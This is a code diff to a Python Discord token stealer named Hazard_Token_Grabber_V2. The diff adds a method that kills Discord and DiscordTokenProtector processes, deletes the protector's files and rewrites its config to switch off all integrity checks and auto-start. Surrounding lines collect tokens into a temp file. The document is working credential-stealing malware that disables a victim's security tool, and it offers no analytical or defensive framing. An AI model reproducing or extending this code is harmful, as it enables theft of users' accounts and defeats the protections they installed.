@@ -1,5 +1,5 @@
-import requests
 import os
+import requests
 import shutil
 import sqlite3
 import zipfile
@@ -97,6 +97,46 @@ class Hazard_Token_Grabber_V2:
             for name in files:
                 discord_file = os.path.join(root, name)
                 os.startfile(discord_file)
+
+    def bypass_token_protector(self):
+        #fucks up the discord token protector by https://github.com/andro2157/DiscordTokenProtector
+        tp = f"{self.roaming}\\DiscordTokenProtector\\"
+        for proc in psutil.process_iter():
+            if any(procstr in proc.name().lower() for procstr in\
+            ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']):
+                try:
+                    proc.kill()
+                except psutil.NoSuchProcess:
+                    pass
+        for i in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
+            try:
+                os.remove(tp+i)
+            except Exception:
+                pass 
+        try:
+            with open(tp+"config.json") as f:
+                item = json.load(f)
+                item['auto_start'] = False
+                item['auto_start_discord'] = False
+                item['integrity'] = False
+                item['integrity_allowbetterdiscord'] = False
+                item['integrity_checkexecutable'] = False
+                item['integrity_checkhash'] = False
+                item['integrity_checkmodule'] = False
+                item['integrity_checkscripts'] = False
+                item['integrity_checkresource'] = False
+                item['integrity_redownloadhashes'] = False
+                item['iterations_iv'] = 364
+                item['iterations_key'] = 457
+                item['version'] = 69420
+
+            with open(tp+"config.json", 'w') as f:
+                json.dump(item, f, indent=2, sort_keys=True)
+
+            with open(tp+"config.json", 'a') as f:
+                f.write("\n\n//Rdimo just shit on this token protector | https://github.com/Rdimo")
+        except Exception:
+            pass
 
     def bypass_better_discord(self):
         bd = self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"
@@ -251,6 +291,7 @@ class Hazard_Token_Grabber_V2:
                                     if token in self.tokens:
                                         continue
                                     self.tokens.append(token)
+                                    
     def neatifyTokens(self):
         f = open(self.tempfolder+"\\Discord Info.txt", "w", encoding="cp437", errors='ignore')
         for token in self.tokens:
